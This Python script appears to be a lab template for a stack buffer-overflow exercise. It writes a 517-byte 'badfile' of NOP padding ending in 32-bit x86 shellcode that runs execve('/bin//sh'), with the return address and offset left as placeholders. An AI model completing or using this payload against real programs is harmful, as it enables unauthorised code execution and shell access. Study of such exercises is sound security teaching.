#!/usr/bin/python3
import sys

shellcode = (
    "\x31\xc0"  # xorl    %eax,%eax
    "\x50"  # pushl   %eax
    "\x68"
    "//sh"  # pushl   $0x68732f2f
    "\x68"
    "/bin"  # pushl   $0x6e69622f
    "\x89\xe3"  # movl    %esp,%ebx
    "\x50"  # pushl   %eax
    "\x53"  # pushl   %ebx
    "\x89\xe1"  # movl    %esp,%ecx
    "\x99"  # cdq
    "\xb0\x0b"  # movb    $0x0b,%al
    "\xcd\x80"  # int     $0x80
).encode("latin-1")


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

# Put the shellcode at the end
start = 517 - len(shellcode)
content[start:] = shellcode

##################################################################
ret = 0xAABBCCDD  # replace 0xAABBCCDD with the correct value
offset = 0  # replace 0 with the correct value

content[offset : offset + 4] = (ret).to_bytes(4, byteorder="little")
##################################################################

# Write the content to a file
with open("badfile", "wb") as f:
    f.write(content)
